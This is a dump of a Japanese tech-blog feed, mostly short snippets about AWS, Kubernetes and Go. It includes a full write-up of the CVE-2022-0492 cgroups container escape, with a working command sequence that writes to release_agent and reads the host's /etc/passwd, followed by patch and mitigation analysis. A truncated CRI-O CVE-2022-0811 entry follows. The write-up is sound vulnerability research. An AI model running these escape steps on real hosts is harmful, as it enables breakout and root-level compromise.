2022/06","link":"https://zenn.dev/tayusa/articles/7b3dd99a79403c","contentSnippet":"はじめにネットで公開されている数々のAWS Certified Solutions Architect - Professionalの合格体験記や勉強法などにお世話になったので自分も書いてみることにしました。教材選びや学習スケジュールの参考になれば嬉しいです。 私の前提知識まず、本題に入る前に私のSAPを受ける前までのスキルセットを軽く紹介させてください。業務でのAWS歴は8ヶ月ほどで現在SREとして働いています以前はRuby on Railsなどを書くプログラマーをやっていましたAWS SAAは2022/03に取得しましたAWSではない他のIT資格は以下で...","isoDate":"2022-06-24T00:36:49.000Z","dateMiliSeconds":1656031009000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"istio-proxyがどのように通信を仲介しているかを知る","link":"https://zenn.dev/tayusa/articles/aa54bbff3d0d2d","contentSnippet":"目的前回、書いた記事で素のKubernetesのネットワークについて少し理解できたのですが、Istioを入れた場合はEnvoyが通信を仲介するのでその仕組みを知りたく調べてみましたhttps://zenn.dev/tayusa/articles/c705cd65b6ee74 環境OS: Arch Linux(5.17.9-arch1-1)k8sの環境: kindhttps://kind.sigs.k8s.io/version 0.14.0デフォルトのk8sのバージョンは1.24 クラスタのセットアップ kindでクラスタ作成https:...","isoDate":"2022-06-03T18:42:53.000Z","dateMiliSeconds":1654281773000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"asdf のバージョン アップがうまくいかなかった","link":"https://zenn.dev/kyohei_saito/articles/40a13800f34d5f","contentSnippet":"最近、転職により業務環境が Windows から Mac に変わったことで、ツール類のバージョン管理として asdf を使用しはじめました。asdf 自体のバージョンアップがうまくいかない事象に直面したため、解決方法をメモしておきます。 サマリHomebrew により asdf をバージョンアップしたら、asdf でインストールしたツールが使用できなくなりました。shim ディレクトリ内のスクリプトに記述された asdf のパスが古いバージョンとなっていたことが原因でした。shim ディレクトリを別のディレクトリに移動後、asdf reshim を実行することで shim デ...","isoDate":"2022-05-29T09:36:54.000Z","dateMiliSeconds":1653817014000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"KubernetesのServiceの挙動を確認する","link":"https://zenn.dev/tayusa/articles/c705cd65b6ee74","contentSnippet":"目的普段、Kubernetesを触ってはいるのですが、表面的な使い方しか知らないので動きを確認してみます 環境OS: Arch Linux(5.17.9-arch1-1)k8sの環境: kindhttps://kind.sigs.k8s.io/version 0.14.0デフォルトのk8sのバージョンは1.24 ひとまず、ローカルでクラスタを立てる環境に応じてkindをインストールhttps://kind.sigs.k8s.io/docs/user/quick-start/#installationクラスタの作成$ kind ...","isoDate":"2022-05-28T12:19:47.000Z","dateMiliSeconds":1653740387000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Python Experiment: For VS Comprehension 1","link":"https://daisuke1024akagawa.medium.com/python-experiment-for-vs-comprehension-1-28868928fe8d?source=rss-c54ac439ad2b------2","isoDate":"2022-05-26T14:21:48.000Z","dateMiliSeconds":1653574908000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Goで立てたWebサーバーでソケットを学ぶ","link":"https://zenn.dev/tayusa/articles/077d911b357a92","contentSnippet":"目的TCPなどにまるで明るくないので、学習のために調べてみました 環境Arch Linux(5.17.9-arch1-1)go version go1.18.3 linux/amd64 やることGoで書いたWebサーバーを動かして挙動を確認したり、少しコードを見てみますコードは以下ですpackage mainimport (\\t\\"fmt\\"\\t\\"log\\"\\t\\"net/http\\"\\t\\"time\\")func main() {\\thttp.HandleFunc(\\"/\\", func(w http.ResponseWriter, r *http.Request)...","isoDate":"2022-05-22T12:32:11.000Z","dateMiliSeconds":1653222731000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"zennの執筆環境向けdevcontainerを作成した話","link":"https://zenn.dev/bells17/articles/zenn-devcontainer","contentSnippet":"タイトルまんまでzennの執筆環境向けdevcontainerを作成したという話です前々からzennの記事はGithub repositoryと連携して書いており、codespaceにvscodeから接続して執筆してたのですが、zenn-cliを使ったプレビューが可能らしいということを最近知ったので、devcontainerの勉強がてらサクッとプレビューが可能な環境を作りましたという内容になります作ったdevcontainerのリポジトリはこちらですhttps://github.com/bells17/zenn-template 使い方READMEに書いてある通りですが、te...","isoDate":"2022-04-17T15:27:41.000Z","dateMiliSeconds":1650209261000,"authorName":"bells17","authorId":"bells17"},{"title":"[2022/04/15] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220415","contentSnippet":"普段は#kubenewsの2022年04月15日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/j76uphcYs2E 告知とかニュースっぽいもの Kubernetes Meetup TokyoでLTする予定ですhttps...","isoDate":"2022-04-15T12:50:24.000Z","dateMiliSeconds":1650027024000,"authorName":"bells17","authorId":"bells17"},{"title":"吉祥寺.pm29で久しぶりにLTしてきました #kichijojipm","link":"https://blog.masasuzu.net/entry/2022/04/15/202342","contentSnippet":"kichijojipm.connpass.com久しぶりにLTしてきました。久しぶりに外で発表したいなと思いつつ、だいぶブランクあるのでちょうどいいリハビリできるところがないかな。— masasuzu (@masasuz) 2022年4月9日  こんなこと考えてたら良いタイミングできちぴーが開催されるので、LT申し込んでみました。#kichijojipm 7年ぶりにLTしたので緊張した。というのと、前回の発表調べて7年前もきちぴーあったのかという驚きもあった。— masasuzu (@masasuz) 2022年4月12日  どうやら7年ぶりだったみたいです。タイミング的に最終出社日の翌日だったので、キャリアの話をしました。diary.masasuzu.net正直、LTにおさまる量じゃなかったのは反省点です。資料ももうちょっとなんとかできたかなあという気持ちがあります。少しずつ登壇回数増やして、勘を取り戻していきたいところ。","isoDate":"2022-04-15T11:23:42.000Z","dateMiliSeconds":1650021822000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2022-04-12 吉祥寺.pm 29","link":"https://speakerdeck.com/masasuzu/2022-04-12-ji-xiang-si-dot-pm-29","contentSnippet":"","isoDate":"2022-04-12T04:00:00.000Z","dateMiliSeconds":1649736000000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"CVE-2022-0492 調査まとめ","link":"https://kyohmizu.hatenablog.com/entry/2022/04/06/233150","contentSnippet":"cgroups v1 の脆弱性 CVE-2022-0492 について、調査した内容をまとめました。イベントで発表した内容ですが、時間の都合で語りきれなかった部分も多く、内容を加筆してブログに書くことにしました。 speakerdeck.comCVE-2022-0492 概要release_agent についてエクスプロイト前提条件要点検証修正パッチコンテナセキュリティseccompAppArmor (SELinux)Kubernetes の場合EKS, GKE の場合さいごに参考リンクCVE-2022-0492LinuxコンテナセキュリティCVE-2022-0492 概要CVE-2022-0492 は cgroups v1 における特権昇格・コンテナブレイクアウトの脆弱性です。cgroups v1 の release_agent 機能を悪用することで、コンテナからホストの root 権限で任意コマンド実行が可能となります。詳細は後述しますが、これは本来特権コンテナに限定されるべき設定が、capabilities のチェック漏れにより非特権コンテナから行える状態だったことが原因です。本脆弱性は seccomp や AppArmor/SELinux を有効にすることで回避可能です。release_agent についてcgroups v1 は cpu, memory, pids のようにリソースをサブシステムに分割し、各サブシステムがディレクトリ構造を取っています。# ls /sys/fs/cgroup/blkio  cpu,cpuacct  cpuset   freezer  memory  net_cls           net_prio    pids  systemdcpu    cpuacct      devices  hugetlb  misc    net_cls,net_prio  perf_event  rdma  unifiedrelease_agent は各 cgroup サブシステムのルートディレクトリに配置されるファイルで、cgroup 内のプロセスが終了する時に起動させるプログラムを設定します。リリースエージェントプログラム の起動の有無は、cgroup ディレクトリ内の notify_on_release の値で判断されます。このファイルはルート以下、各 child cgroup のディレクトリにも配置されています。notify_on_release = 1 の場合、リリースエージェントプログラムを起動します。cgroup のディレクトリ構成pids cgroup のルートディレクトリを見ると、以下のように release_agent, notify_on_release のファイルを確認できます。# ls /sys/fs/cgroup/pids/cgroup.clone_children  cgroup.sane_behavior  docker      notify_on_release  system.slice  user.slicecgroup.procs           default               init.scope  release_agent      tasks# cat /sys/fs/cgroup/pids/release_agent   ← 空のファイル# cat /sys/fs/cgroup/pids/notify_on_release 0ちなみにコンテナに CAP_SYS_ADMIN がある場合、release_agent を使えば本脆弱性を利用することなくブレイクアウト可能です。https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)また cgroups v2 には release_agent がなく、リリースの通知は別の仕組みを使っています。エクスプロイト前提条件本脆弱性は次の条件を全て満たす場合に影響があります。root ユーザーまたは、no_new_privsフラグなしでコンテナを起動しているseccomp, AppArmor/SELinux がいずれも有効でないホストの非特権ユーザー名前空間が有効（ubuntu ではデフォルトの設定です）各設定の確認方法↓# cat /proc/sys/kernel/unprivileged_userns_clone   ← 非特権ユーザ名前空間1# cat /proc/self/status | grep Seccomp   ← seccompSeccomp:    0Seccomp_filters:    0# cat /proc/self/attr/current   ← AppArmordocker-default (enforce)要点コンテナから cgroups の release_agent に書き込みたいrdma サブシステムは root cgroup に所属しているが、readonly でマウントされているcgroup を rw で新たにマウントしたいが、マウントには CAP_SYS_ADMIN が必要unshare で user namespace (ns) を作成すれば CAP_SYS_ADMIN が得られるcgroup, mount ns も同時に作成することで cgroup をマウント可能にrdma cgroup をマウント すると release_agent に書き込み可能cgroup 内のプロセスが終了するタイミングで、任意のプログラムをホストの root 権限で実行検証脆弱な Kernel バージョンで CVE-2022-0492 を検証します。インスタンスに用意した ubuntu 上で、seccomp, AppArmor をオフにした docker コンテナを起動します。# uname -aLinux ip-172-31-1-29 5.13.0-1017-aws #19~20.04.1-Ubuntu SMP Mon Mar 7 12:53:12 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashdocker はコンテナ作成時に cgroup ns を作成しないので、コンテナはホストと同じ cgroup ns に所属しています。自身の cgroup を確認すれば root cgroup からのパスがわかるため、コンテナ内から各サブシステムが root cgroup に所属しているかどうか調べることができます。root@ab988587a245:/# cat /proc/self/cgroup13:misc:/12:rdma:/   ← rdma サブシステムは root cgroup11:hugetlb:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a10:cpuset:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a9:net_cls,net_prio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a8:perf_event:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a7:blkio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a6:devices:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a5:freezer:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a4:cpu,cpuacct:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a3:pids:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a2:memory:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a1:name=systemd:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a0::/system.slice/containerd.serviceこれで rdma サブシステムが root cgroup に所属していることがわかりました。root@ab988587a245:/# mount | grep \'cgroup (ro\'cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)   ← readonly でマウントされているcgroup on /sys/fs/cgroup/misc type cgroup (ro,nosuid,nodev,noexec,relatime,misc)root@ab988587a245:/# ls -l /sys/fs/cgroup/rdma/total 0-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.clone_children-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.procs-r--r--r--  1 root root 0 Mar 15 01:40 cgroup.sane_behavior-rw-r--r--  1 root root 0 Mar 15 01:40 notify_on_release-rw-r--r--  1 root root 0 Mar 29 16:01 release_agentdrwxr-xr-x 13 root root 0 Mar 26 21:07 system.slice-rw-r--r--  1 root root 0 Mar 15 01:40 tasksroot@ab988587a245:/# echo test > /sys/fs/cgroup/rdma/release_agent bash: /sys/fs/cgroup/rdma/release_agent: Read-only file system   ← 書き込みエラーというわけで、cgroup を rw でマウントできれば良いことになります。ここで capability を確認すると、コンテナは CAP_SYS_ADMIN を持っておらず、このままでは cgroup をマウントする権限がありません。root@ab988587a245:/# apt update && apt install -y libcap2-binroot@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 00000000a80425fbroot@ab988587a245:/# capsh --decode=00000000a80425fb0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcaproot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mntmount: /mnt: permission denied.   ← マウントエラーCAP_SYS_ADMIN を付与するため user ns を作成し新たにプロセスを立ち上げます。さらに mount, cgroup ns を同時に作成することで、コンテナ内でのマウントが可能になります。マウントさえできれば release_agent に書き込むことができます。root@ab988587a245:/# unshare -rmC bash   ← user, mount, cgroup ns を作成root@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 000001ffffffffffroot@ab988587a245:/# capsh --decode=000001ffffffffff0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40   ← CAP_SYS_ADMIN を持つroot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mnt   ← rdma サブシステムをマウントroot@ab988587a245:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@ab988587a245:/# mount | grep \'cgroup (rw\'cgroup on /mnt type cgroup (rw,relatime,rdma)ここまでで、コンテナ内から release_agent に書き込めるようになりました。続いてコンテナ内のルート (/) に、ホストの権限で実行させたいプログラムを配置します。今回は /etc/passwd をコンテナ内に出力するスクリプトを作成しています。release_agent に設定するのはプログラムのパスですが、ホストから見た絶対パスを指定する必要があります。root@ab988587a245:/# host_path=`sed -n \'s/.*\\\\perdir=\\\\([^,]*\\\\).*/\\\\1/p\' /etc/mtab`root@ab988587a245:/# echo $host_path/var/lib/docker/overlay2/20c4102a1a817b0e564734054b876c051732c62f4993ce682508ac7cd7fcb1c6/diff   ← upperdir のパスroot@ab988587a245:/# echo \\"$host_path/cmd\\" > /mnt/release_agentroot@ab988587a245:/# echo \'#!/bin/sh\' > /cmdroot@ab988587a245:/# echo \\"cat /etc/passwd > $host_path/output\\" >> /cmdroot@ab988587a245:/# chmod a+x /cmd最後に用意したプログラムを起動するため、cgroup 内のプロセスを空にします。root@ab988587a245:/# mkdir /mnt/xx   ← child cgroup を作成root@ab988587a245:/# ls /mnt/xx/cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasksroot@ab988587a245:/# echo 1 > /mnt/xx/notify_on_releaseroot@ab988587a245:/# sh -c \\"echo \\\\$\\\\$\\" > /mnt/xx/cgroup.procs   ← すぐに終了するプロセスを child cgroup に追加root@ab988587a245:/# cat /output   ← コンテナ内にホストの /etc/passwd が出力されているroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologin...修正パッチhttps://github.com/torvalds/linux/commit/24f6008564183aa120d07c03d9289519c2fe02afhttps://github.com/torvalds/linux/commit/467a726b754f474936980da793b4ff2ec3e382a7  static ssize_t cgroup_release_agent_write(struct kernfs_open_file *of, char *buf, size_t nbytes, loff_t off)  {    struct cgroup *cgrp;+   struct cgroup_file_ctx *ctx;    BUILD_BUG_ON(sizeof(cgrp->root->release_agent_path) < PATH_MAX);+   /*+    * Release agent gets called with all capabilities,+    * require capabilities to set release agent.+    */+   ctx = of->priv;+   if ((ctx->ns->user_ns != &init_user_ns) ||+       !file_ns_capable(of->file, &init_user_ns, CAP_SYS_ADMIN))+     return -EPERM;    cgrp = cgroup_kn_lock_live(of->kn, false);修正後は上記検証手順での release_agent への書き込みはできません。これは書き込みプロセスが CAP_SYS_ADMIN は持ちますが、init user ns でないためだと理解しています。init user ns かつ CAP_SYS_ADMIN を同時に満たすのは、非特権コンテナにおいては不可能となりました。（厳密にはプロセスの capability と、対象 cgroup の所有 user ns のチェックを行なっています）# uname -r5.17.0-051700rc7-generic# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@a45e44c77da9:/# unshare -rmC bashroot@a45e44c77da9:/# mount -t cgroup -o rdma cgroup /mntroot@a45e44c77da9:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@a45e44c77da9:/# echo test > /mnt/release_agent bash: echo: write error: Operation not permittedただし特権コンテナでは引き続きコンテナブレイクアウトは可能です。SELinux を設定する等の対策は必要です。コンテナセキュリティコンテナセキュリティと本脆弱性の関係について簡単に見ていきます。seccompseccomp はコンテナ内で実行できるシステムコールを制限します。システムコールをブロックするため、ns を作成する段階でエラーとなります。# docker run --rm -it --security-opt apparmor=unconfined ubuntu bashroot@fb3522b81478:/# cat /proc/self/status | grep SeccompSeccomp:    2Seccomp_filters:    1root@fb3522b81478:/# unshare -rmC bashunshare: unshare failed: Operation not permittedAppArmor (SELinux)ファイル操作、プログラム実行、capabilities 等を制限します。# docker run --rm -it --security-opt seccomp=unconfined ubuntu bashroot@46912ffebb2c:/# cat /proc/self/attr/current docker-default (enforce)root@46912ffebb2c:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission deniedKubernetes の場合Kubernetes においては、seccomp や AppArmor/SELinux は環境や設定次第では OFF のため影響が出る可能性があります。AppArmor/SELinux は Kubernetes ノードやコンテナランタイムで有効にする必要があります。さらに seccomp は Pod のマニフェストにも設定しなければなりません。また securityContext に適切な設定をすることも重要です。allowPrivilegeEscalation, readOnlyRootFilesystem, capabilities 等でコンテナの機能を制限すれば、今後生まれる脆弱性の予防にもなると考えます。EKS, GKE の場合EKS のノードに使われる Amazon Linux 2 では、rdma のようなコンテナ内に root cgroup がマウントされたサブシステムはないようです。このため cgroup を新規にマウントしても release_agent は見えず、本脆弱性を悪用することはできません。# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@287fcd93a54f:/# cat /proc/self/cgroup 11:pids:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b010:devices:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b09:hugetlb:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b08:perf_event:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b07:net_cls,net_prio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b06:blkio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b05:memory:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b04:cpu,cpuacct:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b03:freezer:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b02:cpuset:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b01:name=systemd:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b0GKE のノードに使われる COS では、デフォルトで AppArmor が有効になっているようです。(https://cloud.google.com/container-optimized-os/docs/how-to/secure-apparmor)$ k run ubuntu --image ubuntu -- sleep 3600pod/ubuntu created$ k exec -it ubuntu -- bashroot@ubuntu:/# cat /proc/self/attr/current cri-containerd.apparmor.d (enforce)root@ubuntu:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission denied以上のことから EKS, GKE では本脆弱性の影響はなさそうです。さいごに本脆弱性の調査を通じて、コンテナを構成する Linux の要素技術やコンテナセキュリティへの理解が深まりました。Linux の技術について包括的に学ぶのは（個人的には）難しいので、このような脆弱性の調査から学ぶアプローチも良いのではと思います。本記事が皆さんの学習の糧になれば幸いです。参考リンクCVE-2022-0492https://unit42.paloaltonetworks.jp/cve-2022-0492-cgroups/https://sysdig.jp/blog/detecting-mitigating-cve-2021-0492-sysdig/https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2022/03/06/cve-2022-0492https://nvd.nist.gov/vuln/detail/CVE-2022-0492Linuxhttps://lwn.net/Articles/679786/https://www.nginx.com/blog/what-are-namespaces-cgroups-how-do-they-work/https://linuxhint.com/install-linux-kernel-ubuntu/https://man7.org/linux/man-pages/man7/cgroups.7.htmlhttps://blog.tiqwab.com/2021/11/13/docker-and-cgroups.htmlhttps://en.wikipedia.org/wiki/Seccomphttps://en.wikipedia.org/wiki/Security-Enhanced_Linuxhttps://manpages.ubuntu.com/manpages/xenial/man5/apparmor.d.5.htmlコンテナセキュリティhttps://container-security.dev/security/breakout-to-host.htmlhttps://speakerdeck.com/mochizuki875/container-dev-securityhttps://speakerdeck.com/mochizuki875/container-seccomp","isoDate":"2022-04-06T14:31:50.000Z","dateMiliSeconds":1649255510000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"[2022/04/01] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220401","contentSnippet":"普段は#kubenewsの2022年04月01日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/qNk58ApYjdg 告知とかニュースっぽいもの Kubernetes Meetup Tokyoで登壇しましたhttps:/...","isoDate":"2022-04-01T12:45:40.000Z","dateMiliSeconds":1648817140000,"authorName":"bells17","authorId":"bells17"},{"title":"CVE-2022-0811 調査まとめ","link":"https://kyohmizu.hatenablog.com/entry/2022/03/28/182243","contentSnippet":"CRI-O の脆弱性 (CVE-2022-0811) について調べた内容をまとめました。脆弱性の詳細と、関連する CRI-O の実装や Linux の機能を紹介します。CVE-2022-0811 概要CRI-O についてCRI-O 概要pinns による pod へのカーネルパラメータ設定Coredumpエクスプロイト要点検証回避策修正パッチcommit1commit2containerd の場合さいごに参考リンクCVE-2022-0811 概要CVE-2022-0811 は CRI-O の任意コード実行・コンテナブレイクアウトの脆弱性で、報告した CrowdStrike 社は「cr8escape」と呼んでいます。CRI-O の v1.19 以降に影響があり、すでに修正バージョンがリリースされています。 (詳細は Security Advisory を参照)カーネルパラメータ設定の検証不備により、/proc/sys/kernel/core_pattern への書き込みが可能となっていました。これによりプロセスを異常終了させることでホストの root 権限で任意の操作を行えます。CRI-O についてCRI-O 概要https://github.com/cri-o/cri-oCRI-O は Kubernetes に最適化された軽量な高レベルコンテナランタイムです。CLI ツールは crictl (https://github.com/kubernetes-sigs/cri-tools) を使用します。# cat container-config.json {  \\"metadata\\": {      \\"name\\": \\"ubuntu\\"  },  \\"image\\":{      \\"image\\": \\"ubuntu\\"  },  \\"command\\": [      \\"sleep\\",      \\"3600\\"  ],  \\"log_path\\":\\"ubuntu.0.log\\",  \\"linux\\": {  }}# cat pod-config.json {    \\"metadata\\": {        \\"name\\": \\"ubuntu-sandbox\\",        \\"namespace\\": \\"default\\",        \\"attempt\\": 1,        \\"uid\\": \\"hdishd83fjaiarawuwk28bcsb\\"    },    \\"log_directory\\": \\"/tmp\\",    \\"linux\\": {    }}# crictl runp pod-config.json   ← pod の起動b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc# crictl create b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc container-config.json pod-config.json   ← コンテナ作成2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl start 2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7   ← コンテナ起動2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl podsPOD ID              CREATED             STATE               NAME                NAMESPACE           ATTEMPT             RUNTIMEb69761649f8f6       42 seconds ago      Ready               ubuntu-sandbox      default             1                   (default)# crictl psCONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID2ce8010c047df       ubuntu              19 seconds ago      Running             ubuntu              0                   b69761649f8f6pinns による pod へのカーネルパラメータ設定CRI-O は pinns utility を使用することで、pod 起動時にカーネルパラメータ (sysctls) を設定できます。first commit)設定には -s オプションを使用し、key=value の形式で複数のカーネルパラメータを連結して渡すことができます。pinns -s kernel_parameter1=value1+kernel_parameter2=value2設定可能な sysctls は以下の実装で制限されています。https://github.com/cri-o/cri-o/blob/main/pkg/config/sysctl.govar prefixNamespaces = map[string]Namespace{  \\"kernel.shm\\": IpcNamespace,  \\"kernel.msg\\": IpcNamespace,  \\"fs.mqueue.\\": IpcNamespace,  \\"net.\\":       NetNamespace,}// Validate checks that a sysctl is whitelisted because it is known to be// namespaced by the Linux kernel. The parameters hostNet and hostIPC are used// to forbid sysctls for pod sharing the respective namespaces with the host.// This check is only used on sysctls defined by the user in the crio.conf// file.func (s *Sysctl) Validate(hostNet, hostIPC bool) error {  nsErrorFmt := \\"%q not allowed with host %s enabled\\"  if ns, found := namespaces[s.Key()]; found {    if ns == IpcNamespace && hostIPC {      return errors.Errorf(nsErrorFmt, s.Key(), ns)    }    return nil  }  for p, ns := range prefixNamespaces {    if strings.HasPrefix(s.Key(), p) {      if ns == IpcNamespace && hostIPC {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      if ns == NetNamespace && hostNet {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      return nil    }  }  return errors.Errorf(\\"%s not whitelisted\\", s.Key())}sysctls の適用は pinns 内に実装されており、-s オプションの設定値をもとに /proc/sys/ 以下のファイルに書き込みを行なっています。https://github.com/cri-o/cri-o/blob/main/pinns/src/sysctl.cstatic int write_sysctl_to_file (char * sysctl_key, char* sysctl_value){  if (!sysctl_key || !sysctl_value)  {    pwarn (\\"sysctl key or value not initialized\\");    return -1;  }  // replace periods with / to create the sysctl path  for (char* it = sysctl_key; *it; it++)    if (*it == \'.\')      *it = \'/\';  _cleanup_close_ int dirfd = open (\\"/proc/sys\\", O_DIRECTORY | O_PATH | O_CLOEXEC);  if (UNLIKELY (dirfd < 0))  {    pwarn (\\"failed to open /proc/sys\\");    return -1;  }  _cleanup_close_ int fd = openat (dirfd, sysctl_key, O_WRONLY);  if (UNLIKELY (fd < 0))  {    pwarnf (\\"failed to open /proc/sys/%s\\", sysctl_key);    return -1;  }  int ret = TEMP_FAILURE_RETRY (write (fd, sysctl_value, strlen (sysctl_value)));  if (UNLIKELY (ret < 0))  {    pwarnf (\\"failed to write to /proc/sys/%s\\", sysctl_key);    return -1;  }  return 0;}Coredumpプロセスが異常終了した時に、プロセスメモリの dump を core ファイルとして出力します。Coredump の設定は /proc/sys/kernel/core_pattern に書かれており、ファイルの直接編集や sysctl コマンドで設定を変更できます。# sysctl -w kernel.core_pattern=\\"%e-%s.core\\"kernel.core_pattern には dump の出力先パスを指定しますが、最初文字がパイプ | 